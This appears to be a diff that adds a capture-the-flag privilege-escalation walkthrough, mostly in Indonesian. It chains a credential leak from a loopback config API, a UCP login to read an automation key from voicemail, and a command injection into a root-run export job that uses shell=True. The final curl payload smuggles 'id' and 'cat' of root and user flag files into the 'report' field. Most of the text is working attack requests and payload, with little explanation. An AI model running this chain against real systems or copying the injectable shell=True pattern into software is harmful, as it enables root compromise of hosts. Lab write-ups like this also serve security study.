@@ -1,0 +1,27 @@
+www-data -> root: credential leak di loopback ops plane + command injection.
+
+# 1) Watchtower /api/config
+GET http://127.0.0.1:3000/api/config
+{
+  "telephony_user": "ucp-template",
+  "telephony_pass": "Pr0gr3ssB4r_2026"
+}
+
+# 2) Login UCP, tambah widget voicemail, baca inbox
+POST http://127.0.0.1:8080/ucp/login
+  username=ucp-template&password=Pr0gr3ssB4r_2026
+POST http://127.0.0.1:8080/ucp/widgets
+  widget=voicemail
+GET http://127.0.0.1:8080/ucp/inbox
+  -> automation key: PB_AUTO_7b3f9a1c4e0d2f6a
+
+# 3) Automation berjalan sebagai root dan memakai shell=True
+# /opt/automation/app.py:
+command = f"tar czf {EXPORT_DIR}/{report}.tgz {DATA_DIR} 2>&1"
+subprocess.run(command, shell=True, capture_output=True, text=True, timeout=20)
+
+# 4) Payload command injection
+KEY=PB_AUTO_7b3f9a1c4e0d2f6a
+curl -sS -X POST http://127.0.0.1:9000/jobs/export \
+  -H "Authorization: Bearer $KEY" -H 'Content-Type: application/json' \
+  --data-binary '{"report":"x; id; echo ---CAT---; cat /root/root.txt /home/deploy/user.txt 2>&1 #"}'
